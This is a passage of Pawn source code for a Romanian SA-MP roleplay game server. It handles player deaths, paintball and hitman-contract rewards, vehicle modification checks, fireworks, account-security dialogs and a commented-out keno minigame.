			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
		}
		new caller = Mobile[playerid];
		if(caller != -1)
		{
			SendClientMessage(caller,  COLOR_GRAD2, "The line just Went dead....");
			CellTime[caller] = 0;
			CellTime[playerid] = 0;
			Mobile[caller] = -1;
			Mobile[playerid] = -1;
			CellTime[playerid] = 0;
		}
		if(PlayerInfo[playerid][pPaintBallG] > 0)
		{
			if(IsPlayerConnected(killerid))
			{
				if(PlayerInfo[killerid][pPaintBallG] > 0)
				{
					foreach(Player, iddd)
					{
						if(PlayerInfo[iddd][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
						{
							SendDeathMessageToPlayer(iddd, killerid, playerid, reason);
						}
					}
					PlayerInfo[killerid][pPaintBallKills]++;
					format(string,sizeof(string),"* You were killed by %s", GetName(killerid));
					SendClientMessage(playerid, COLOR_GENANNOUNCE, string);

					format(string,sizeof(string),"* You killed %s", GetName(playerid));
					SendClientMessage(killerid, COLOR_GENANNOUNCE, string);
					if(PlayerInfo[killerid][pPaintBallKills] > PaintBallWinnerKills)
					{
						PaintBallWinnerKills = PlayerInfo[killerid][pPaintBallKills];
						foreach(Player, i)
						{
							if(IsPlayerConnected(i))
							{
								if(PlayerInfo[i][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
								{
									format(string,sizeof(string),"{0066FF}PaintBall: {FFFFFF}%s lead %d killing.",GetName(killerid),PaintBallWinnerKills);
									SendClientMessage(i, -1, string);
								}
							}
						}
					}
				}	
			}
		}	
		if(PlayerInfo[playerid][pHeadValue] > 0)
		{
	    	if(IsPlayerConnected(killerid))
	    	{
		    	if(PlayerInfo[killerid][pMember] == 11)
		    	{
		        	if(GoChase[killerid] == playerid)
		        	{
						new killer[MAX_PLAYER_NAME];
						GetPlayerName(killerid, killer, sizeof(killer));
						GivePlayerCash(killerid, PlayerInfo[playerid][pHeadValue]);
						if(Undercover[killerid] == 1 && PhoneOnline[killerid] == 1 && GetDistanceBetweenPlayers(killerid,playerid) >= 100)
						{
							format(string,256,"%s has succesfully completed the contract on %s for $%s, distance: %.0fm.",killer,name,FormatNumber(PlayerInfo[playerid][pHeadValue]),GetDistanceBetweenPlayers(killerid,playerid));
							PlayerInfo[playerid][pContracts] += 1;
							Update(playerid,pContractsx);
						}
						if(Undercover[killerid] == 0)
						{
							format(string,256,"%s failed to complete the contract on %s for $%s, distance: %.0fm. Fail reason: not undercover.",killer,name,FormatNumber(PlayerInfo[playerid][pHeadValue]),GetDistanceBetweenPlayers(killerid,playerid));
						}
						if(PhoneOnline[killerid] == 0)
						{
							format(string,256,"%s failed to complete the contract on %s for $%s, distance: %.0fm. Fail reason: phone turned on.",killer,name,FormatNumber(PlayerInfo[playerid][pHeadValue]),GetDistanceBetweenPlayers(killerid,playerid));
						}
						if(GetDistanceBetweenPlayers(killerid,playerid) <= 99)
						{
							format(string,256,"%s failed to complete the contract on %s for $%s, distance: %.0fm. Fail reason: distance/weapon.",killer,name,FormatNumber(PlayerInfo[playerid][pHeadValue]),GetDistanceBetweenPlayers(killerid,playerid));
						}
						SendFamilyMessage(11, COLOR_TEAL, string);
						PlayerInfo[playerid][pHeadValue] = 0;
						GotHit[playerid] = 0;
						GetChased[playerid] = 999;
						GoChase[killerid] = 999;
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `HeadValue`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str,"","");
						Update(killerid, pCashx);
				        togfind[killerid] = 0;
			            PlayerInfo[killerid][pHitT] = 60;
				        mysql_format(SQL, string, sizeof(string), "UPDATE users SET `HitT`='%d' WHERE `name`='%s'", PlayerInfo[killerid][pHitT], PlayerInfo[killerid][pNormalName]);
				        mysql_tquery(SQL,string,"","");
					}
				}
			}
			return 1;
		}
		if(gTeam[playerid] == 3)
		{
 			if(IsPlayerConnected(killerid))
   			{
 	    		/*if(gTeam[killerid] == 3 || gTeam[killerid] == 4 || gTeam[killerid] == 5 || (gTeam[killerid] == 11 && GoChase[killerid] == 999))
   	    		{
 	        		new namekill[25];
   	        		GetPlayerName(killerid,namekill,sizeof(namekill));
					strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
					WantedReason[playerid] = 1;
					format(string,sizeof(string),"Ai fost atacat de %s. Ai 60 de secunde sa folosesti /call 112 pentru a raporta incidentul.",GetName(killerid));
					SCM(playerid,COLOR_SERVER,string);
					WantedTimer[playerid] = SetTimerEx("ClearWanted",60000,false,"d",playerid);
	    		}*/
    		}
	    	return 1;
		}
		if(gTeam[playerid] == 2)
		{
 			if(IsPlayerConnected(killerid))
   			{
 	    		/*if(gTeam[killerid] == 3 || gTeam[killerid] == 4 || gTeam[killerid] == 5 || (gTeam[killerid] == 11 && GoChase[killerid] == 999))
   	    		{
 	        		new namekill[25];
   	        		GetPlayerName(killerid,namekill,sizeof(namekill));
					strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
					WantedReason[playerid] = 1;
					format(string,sizeof(string),"Ai fost atacat de %s. Ai 60 de secunde sa folosesti /call 112 pentru a raporta incidentul.",GetName(killerid));
					SCM(playerid,COLOR_SERVER,string);
					WantedTimer[playerid] = SetTimerEx("ClearWanted",60000,false,"d",playerid);
	    		}*/
    		}
	    	return 1;
		}
		if(gTeam[playerid] == 4)
		{
 			if(IsPlayerConnected(killerid))
   			{
 	    		/*if(gTeam[killerid] == 3 || gTeam[killerid] == 4 || gTeam[killerid] == 5 || (gTeam[killerid] == 11 && GoChase[killerid] == 999))
   	    		{
 	        		new namekill[25];
   	        		GetPlayerName(killerid,namekill,sizeof(namekill));
					strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
					WantedReason[playerid] = 1;
					format(string,sizeof(string),"Ai fost atacat de %s. Ai 60 de secunde sa folosesti /call 112 pentru a raporta incidentul.",GetName(killerid));
					SCM(playerid,COLOR_SERVER,string);
					WantedTimer[playerid] = SetTimerEx("ClearWanted",60000,false,"d",playerid);
	    		}*/
    		}
	    	return 1;
		}
		if(gTeam[playerid] == 5)
		{
 			if(IsPlayerConnected(killerid))
   			{
 	    		/*if(gTeam[killerid] == 3 || gTeam[killerid] == 4 || (gTeam[killerid] == 11 && GoChase[killerid] == 999))
   	    		{
 	        		new namekill[25];
   	        		GetPlayerName(killerid,namekill,sizeof(namekill));
					strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
					WantedReason[playerid] = 1;
					format(string,sizeof(string),"Ai fost atacat de %s. Ai 60 de secunde sa folosesti /call 112 pentru a raporta incidentul.",GetName(killerid));
					SCM(playerid,COLOR_SERVER,string);
					WantedTimer[playerid] = SetTimerEx("ClearWanted",60000,false,"d",playerid);
	    		}*/
    		}
	    	return 1;
		}
		if(gTeam[playerid] == 11)
		{
 			if(IsPlayerConnected(killerid))
   			{
 	    		/*if(gTeam[killerid] == 3 || gTeam[killerid] == 4 || gTeam[killerid] == 5)
   	    		{
 	        		new namekill[25];
   	        		GetPlayerName(killerid,namekill,sizeof(namekill));
					strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
					WantedReason[playerid] = 1;
					format(string,sizeof(string),"Ai fost atacat de %s. Ai 60 de secunde sa folosesti /call 112 pentru a raporta incidentul.",GetName(killerid));
					SCM(playerid,COLOR_SERVER,string);
					WantedTimer[playerid] = SetTimerEx("ClearWanted",60000,false,"d",playerid);
	    		}*/
    		}
	    	return 1;
		}
		killerid = INVALID_PLAYER_ID;
	}
	return 1;
}

new legalmods[48][22] = {
        {400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
        {404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
		{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
        {439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
        {477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
        {491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
        {492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
        {500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
        {517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
        {518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
        {527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
        {534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
        {535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
        {536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
        {540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
        {542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
        {547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
        {550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
        {551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
        {558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
        {559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
        {560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
        {561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
        {562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
        {565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
        {567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
        {575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
        {600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};
stock iswheelmodel(modelid) {

    new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};

    for(new I = 0, b = sizeof(wheelmodels); I != b; ++I) {
        if (modelid == wheelmodels[I])
            return true;

    }

    return false;
}

stock IllegalCarNitroIde(carmodel) {

    new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };

    for(new I = 0, b = sizeof(illegalvehs); I != b; ++I) {

        if (carmodel == illegalvehs[I])
            return true;

    }

    return false;
}

// assumes player is in a car - make sure it is.
stock illegal_nos_vehicle(PlayerID) {

    new carid = GetPlayerVehicleID(PlayerID);
    new playercarmodel = GetVehicleModel(carid);

    return IllegalCarNitroIde(playercarmodel);

}

stock islegalcarmod(vehicleide, componentid) {

    new modok = false;

    // stereo, hydraulics & nos (1x 2x 3x) are special.
    if ( (iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010))) {

        new nosblocker = IllegalCarNitroIde(vehicleide);

        if (!nosblocker)
            modok = true;

    } else {

        // check if the specified model CAN use this particular mod.
        for(new I = 0, b = sizeof(legalmods); I != b; ++I) {

            if (legalmods[I][0] == vehicleide) { // first is car IDE

                for(new J = 1; J < 22; J++) { // start with 1
                    if (legalmods[I][J] == componentid)
                        modok = true;
                }

            }

        }

    }

    return modok;
}
stock SetVehicleSpeed(vehicleid, Float:speed)
{
    new Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2, Float:a;
    GetVehicleVelocity(vehicleid, x1, y1, z1);
    GetVehiclePos(vehicleid, x2, y2, z2);
    GetVehicleZAngle(vehicleid, a); a = 360 - a;
    x1 = (floatsin(a, degrees) * (speed/100) + floatcos(a, degrees) * 0 + x2) - x2;
    y1 = (floatcos(a, degrees) * (speed/100) + floatsin(a, degrees) * 0 + y2) - y2;
    SetVehicleVelocity(vehicleid, x1, y1, z1);
}
public OnPlayerGiveDamageActor(playerid, damaged_actorid, Float: amount, weaponid, bodypart)
{
	if(damaged_actorid == actorbanca[playerid])
	{
		DestroyActor(actorbanca[playerid]);
		SetPlayerVirtualWorld(playerid, 0);
		BusinessRob[playerid] = 1;
		SCM(playerid, COLOR_SERVER, "I've set up a checkpoint on the map, there is a {0066FF}corrupt cop {FFFFFF}that will help to get rid of police.");
		SetPlayerCheckpoint(playerid, 1902.4514,-2020.4919,13.5469,4.0);
		CP[playerid] = 1111222223;
	}
}
public ZeroSec()
{
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{	
		new jucatori_in_raza = 0;
		if( IsPlayerInVehicle(playerid, pizzacar[playerid]) || (IsPlayerInVehicle(playerid, JCurier[playerid][2])) || (IsPlayerInVehicle(playerid, JCiment[playerid][2])) || (IsPlayerInVehicle(playerid, JCariera[playerid][2])))
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(ProxDetectorS(50.0, playerid, i))
					{
						if(i != playerid)
						{
							jucatori_in_raza++;
							DisableRemoteVehicleCollisions(i, 1);
							coliziuniactive[i] = playerid;
						}	
					}
				}	
			}
			if(jucatori_in_raza > 0)
			{
				DisableRemoteVehicleCollisions(playerid, 1);
				coliziuniactive[playerid] = playerid;
			}
		}
	}
	for(new eid = 0; eid < NRARTIFICI; eid++)
	{
		if(Artificie[eid][Lansata] > 0)
		{
			if(Artificie[eid][ObiectFum] >= 0)
			{
				if(IsValidObject(Artificie[eid][ObiectFum]))
				{
					DestroyObject(Artificie[eid][ObiectFum]);
					Artificie[eid][ObiectFum] = -1;
				}
			}	
			if(Artificie[eid][TimpLansare] > 0) { Artificie[eid][TimpLansare]--; }
			if(Artificie[eid][TimpLansare] == 0)
			{
				Artificie[eid][TimpLansare] = 350;
				Artificie[eid][NRFocuri]--;
				new Float:distance,Float:Ax,Float:Ay,Float:Az;

				if(Artificie[eid][NRFocuri] == 0)
				{
					DestroyObject(Artificie[eid][Obiect]);
					Artificie[eid][Lansata] = 0;
					Artificie[eid][TimpLansare] = -1;
					Artificie[eid][Directie] = 0;
					Artificie[eid][TimpDistrugereTotala] = 5;
					Artificie[eid][Obiect] = -1;
					Artificie[eid][TimpCuloare_Distrugere] = -1;
					Artificie[eid][TimpCuloare_Distrugere2] = -1;
					for(new i; i < 25; i++)
					{
						if(IsValidObject(Artificie[eid][Culoare_Distrugere][i]))
						{
							Artificie[eid][TimpCuloare_Distrugere][i] = -1;
							DestroyDynamicObject(Artificie[eid][Culoare_Distrugere][i]);
							Artificie[eid][Culoare_Distrugere][i] = -1;
						}
					}
					for(new i; i < 100; i++)
					{
						if(IsValidObject(Artificie[eid][Culoare_Distrugere2][i]))
						{
							Artificie[eid][TimpCuloare_Distrugere2][i] = 0;
							DestroyObject(Artificie[eid][Culoare_Distrugere2][i]);
							Artificie[eid][Culoare_Distrugere2][i] = -1;
						}
					}
				}
				if(Artificie[eid][NRFocuri] > 0)
				{
					switch(Artificie[eid][Lansata])
					{
						case 1:distance=20.0;
						case 2:distance=10.0;
						case 3:distance=0.0;
						case 4:distance=(-10.0);
						case 5:distance=(-20.0);
					}
					switch(Artificie[eid][Directie])
					{
						case 1:
						{
							Artificie[eid][Lansata]++;
							if(Artificie[eid][Lansata]==6)
							{Artificie[eid][Directie]=0;Artificie[eid][Lansata]=4;}
						}	
						case 0:
						{
							Artificie[eid][Lansata]--;
							if(Artificie[eid][Lansata]==0){Artificie[eid][Lansata]=1;Artificie[eid][Lansata]=2;}
						}
					}
					Ax=Artificie[eid][Artificie_Pozitie][0]+(distance * floatsin(-Artificie[eid][Artificie_Pozitie][3],degrees));
					Ay=Artificie[eid][Artificie_Pozitie][1]+(distance * floatsin(-Artificie[eid][Artificie_Pozitie][3],degrees));
					Az=Artificie[eid][Artificie_Pozitie][2]+Artificie[eid][Artificie_Inaltime];
					Artificie[eid][CuloareArtificie] = CreateDynamicObject(19293,Artificie[eid][Artificie_Pozitie][0],Artificie[eid][Artificie_Pozitie][1],Artificie[eid][Artificie_Pozitie][2],0,0,0);
					MoveDynamicObject(Artificie[eid][CuloareArtificie], Ax,Ay,Az, 20.0);
					Artificie[eid][CuloareArtificie_Pozitie][0] = Ax;
					Artificie[eid][CuloareArtificie_Pozitie][1] = Ay;
					Artificie[eid][CuloareArtificie_Pozitie][2] = Az;
					Artificie[eid][TimpCuloare] = 1;
				}	
			}
		}	
	}	
	return 1;
}
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{	
	return 1;

}
/*CMD:gotoquest(playerid, params[])
{
	new id;
	if(PlayerInfo[playerid][pAdmin] < 7) return SCM(playerid, COLOR_ERROR, "Nu ai acces la aceasta comanda.");
	if(sscanf(params, "i", id)) return SCM(playerid, COLOR_WHITE, "/gotoquest [id]");
	if(id > ultimulomdezapada-1) return SCM(playerid, COLOR_WHITE, "Acel om de zapada nu exista.");
	SetPlayerPos(playerid, OMZapada[id][PozitieOMZapada][0],OMZapada[id][PozitieOMZapada][1],OMZapada[id][PozitieOMZapada][2]);
	SetPlayerVirtualWorld(playerid, playerid+1);
	QuestTimer[playerid] = 3;
	return 1;
}*/
CMD:bsecurity(playerid, params[])
{
	if(gPlayerLogged[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(strlen(PlayerInfo[playerid][pNrTel]) == 10) return SCM(playerid, COLOR_ERROR, "You have already set a phone number.");
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}T-Zone Security{FFFFFF}\n\n-Do you offer the best way to secure your account.\n\
	-If you enable this option you will need to set a valid phone number in the network (Orange, Telekom, Vodafone or digits).\n");
	format(MGLOBAL, sizeof(MGLOBAL), "%s-Once enable this security is super secure your account if another class IP will try to enter your account you will receive a message on your mobile phone.\n\
	-In that message you specified an access code, it is valid for 3 days.\n\
	-If already generated code you can generate only another three days.\n\
	-If you entered the code correctly you will have full access to the account on that IP address!",MGLOBAL);
	ShowPlayerDialog(playerid, DIALOG_BSECURITATE, DIALOG_STYLE_MSGBOX, "Secure account", MGLOBAL, "Activate", "Cancel");
	return 1;
}
CMD:selfie(playerid, params[])
{
	if(gPlayerLogged[playerid] > 0)
	{
		if(GetPlayerState(playerid) != 1) return SendClientMessage(playerid, COLOR_SERVER, "You can use this command vehicles.");
		if(arefreeze[playerid] == 1) return SCM(playerid, COLOR_ERROR, "You can not use animated when you freeze.");
		ApplyAnimation(playerid, "ON_LOOKERS", "Pointup_loop", 4.0, 1, 0, 0, 0, 0);
		/*new remain = ultimulomdezapada;
		new doarodata = 0;
		for(new qs=0; qs<=50; qs++)
		{
			if(QEvent[playerid][qs] == 1)
			{
				remain--;
			}
		}
		if(remain > 0)
		{
			for(new i = 0; i < sizeof(OMZapada); i++)
			{
				if(doarodata == 0)
				{
					if(IsPlayerInRangeOfPoint(playerid, 10.0, OMZapada[i][PozitieOMZapada][0],OMZapada[i][PozitieOMZapada][1],OMZapada[i][PozitieOMZapada][2]))
					{
						if(QEvent[playerid][i] < 1)
						{
							doarodata = 1;
							QEvent[playerid][i] = 1;
							new sqlupdate[1000];
							mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `Quest%d`='1' WHERE `id`='%d'",i, PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, sqlupdate, "", "");
							new remain2 = remain-1;
							if(remain2 > 0)
							{
								format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Quest: {FFFFFF}Mai fa inca %d (/selfie-uri) langa inca %d oameni de zapada.",remain2,remain2);
								SCM(playerid, -1, MGLOBAL);
								for(new i2 = 0; i2 < 9; i2++) 
								{ 
									if(IsValidDynamicObject(Omdezapada[playerid][i][i2])) { DestroyDynamicObject(Omdezapada[playerid][i][i2]); } 
									Omdezapada[playerid][i][i2] = -1; 
								} 
							}
							if(remain2 < 1)
							{
								for(new i1 = 0; i1 < sizeof(OMZapada); i1++) 
								{
									for(new i2 = 0; i2 < 9; i2++) 
									{ 
										if(IsValidDynamicObject(Omdezapada[playerid][i1][i2])) { DestroyDynamicObject(Omdezapada[playerid][i1][i2]); } 
										Omdezapada[playerid][i1][i2] = -1; 
									} 
								}
								new nume[MAX_PLAYER_NAME+1];
								GetPlayerName(playerid, nume, sizeof(nume));
								format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Quest: {FFFFFF}%s a terminat misiunea speciala de craciun.",nume);
								SendClientMessageToAll(-1, MGLOBAL);
								new rprandom = 10 + random(50);
								new banirandom = 50000000 + random(150000000);
								new culorirandom = 10 + random(50);
								new pprandom = 100 + random(1500);
								PlayerInfo[playerid][pLevel] += 1;
								PlayerInfo[playerid][pExp] += rprandom;
								new vipvechi = PlayerInfo[playerid][pVip];
								PlayerInfo[playerid][pVip] = 1;
								GivePlayerCash(playerid, banirandom);
								PlayerInfo[playerid][pHiddenColor] += culorirandom;
								PlayerInfo[playerid][pPremiumPoints] += pprandom;
								Update(playerid, pLevelx);
								Update(playerid, pRP);
								Update(playerid, pVipx);
								Update(playerid, pPremiumPointsx);
								Update(playerid, pHiddenColorx);
								Update(playerid, pCashx);
								if(vipvechi == 0)
								{
									SCM(playerid, -1, "__________________________{0066FF}QUEST TERMINAT{FFFFFF}__________________________");
									SCM(playerid, -1, "{0066FF}Quest: {FFFFFF}Felicitari ai terminat misiunea de craciun!");
									format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Quest: {FFFFFF}Ai castigat +%s RP, +$%s, +%s Culori Hidden, +%s Puncte Premium, un Level UP si Cont VIP.",FormatNumber(rprandom),FormatNumber(banirandom),FormatNumber(culorirandom),
									FormatNumber(pprandom));
									SCM(playerid, -1, MGLOBAL);
								}
								if(vipvechi == 1)
								{
									SCM(playerid, -1, "__________________________{0066FF}QUEST TERMINAT{FFFFFF}__________________________");
									SCM(playerid, -1, "{0066FF}Quest: {FFFFFF}Felicitari ai terminat misiunea de craciun!");
									format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Quest: {FFFFFF}Ai castigat +%s RP, +$%s, +%s Culori Hidden, +%s Puncte Premium si un Level UP.",FormatNumber(rprandom),FormatNumber(banirandom),FormatNumber(culorirandom),
									FormatNumber(pprandom));
									SCM(playerid, -1, MGLOBAL);
								}
							}
						}
					}	
				}
			}
		}*/
		SCM(playerid, -1, "{0066FF}Animation: {FFFFFF}To stop the animation type the command /stopanim.");
	}
	return 1;
}	
public OnPlayerUpdate(playerid)
{	
	if(IsPlayerInAnyVehicle(playerid))
	{
		new accescoliziuni = 0;
		if(IsATruck(GetPlayerVehicleID(playerid)) && viddd[playerid] > 0) { accescoliziuni = 1; }
		if(accescoliziuni == 1)
		{
			if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
			{
				AttachTrailerToVehicle(viddd[playerid], GetPlayerVehicleID(playerid));
			}
		}
	}	
	/*if(timerkeno[playerid] > 0)
	{
		new doarodata = 0;
		timerkeno[playerid]--;
		new str[1000];
		for(new i = 0; i < 15; i++)
		{
			if(doarodata == 0) 
			{
				if(numerekeno[playerid][i] == 0) numerekeno[playerid][i] = 29 + random(59), doarodata = 1;
				for(new enumerare = 0; enumerare < 30; enumerare++)
				{
					new problema = 0;
					for(new x = 0; x < 15; x++)
					{
						if(numerekeno[playerid][i] == numerekeno[playerid][x])
						{
							problema++;
						}
					}
					if(problema > 1)
					{
						new sumarandom = 10 + random(40);
						numerekeno[playerid][i] = 29 + random(sumarandom);
					}
				}
			}
			if(numerekeno[playerid][i] > 0)
			{
				if(i == 0) format(str, sizeof(str), "%d~n~",numerekeno[playerid][i]-28);
				if(i > 0) format(str, sizeof(str), "%s%d~n~",str,numerekeno[playerid][i]-28);
				PlayerTextDrawSetString(playerid, KenoTD[95], str);
				PlayerTextDrawColor(playerid, KenoTD[numerekeno[playerid][i]], -922220289);
				PlayerTextDrawShow(playerid, KenoTD[95]);
				PlayerTextDrawShow(playerid, KenoTD[numerekeno[playerid][i]]);
			}
		}
	}
	if(timerkeno[playerid] == 0)
	{	
		timerkeno[playerid] = -1;
		new bilecastigate = 0;
		new sumabani = MizaKeno[playerid];
		new acastigat = 0;
		for(new x = 29; x <= 88; x++)
		{
			for(new i = 0; i < 15; i++)
			{
				if(BilaSelectata[playerid][x-29] == 1 && numerekeno[playerid][i] == x)
				{
					bilecastigate++;
				}
			}
		}
		if(bilecastigate > 0)
		{
			if(bilecastigate == 2) sumabani = sumabani * 2;
			if(bilecastigate == 3) sumabani = sumabani * 6;
			if(bilecastigate == 4) sumabani = sumabani * 8;
			if(bilecastigate == 5) sumabani = sumabani * 12;
			if(bilecastigate == 6) sumabani = sumabani * 14;
			if(bilecastigate == 7) sumabani = sumabani * 25;
			if(bilecastigate == 8) sumabani = sumabani * 45;
			if(bilecastigate == 9) sumabani = sumabani * 75;
			if(bilecastigate == 10) sumabani = sumabani * 99;
			if(BileSelectate[playerid] == 2)
			{
				if(bilecastigate > 1)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 3)
			{
				if(bilecastigate > 1)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 4)
			{
				if(bilecastigate > 2)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 5)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 6)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 7)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 8)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 9)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
			if(BileSelectate[playerid] == 10)
			{
				if(bilecastigate > 3)
				{
					acastigat = 1;
				}
				else acastigat = 0;
			}
		}
		else acastigat = 0;
		if(acastigat == 1)
		{
			PlayerTextDrawSetString(playerid, KenoTD[98], "Ai_castigat");
			PlayerTextDrawSetString(playerid, KenoTD[106], "CASTIGAT");
			format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(sumabani));
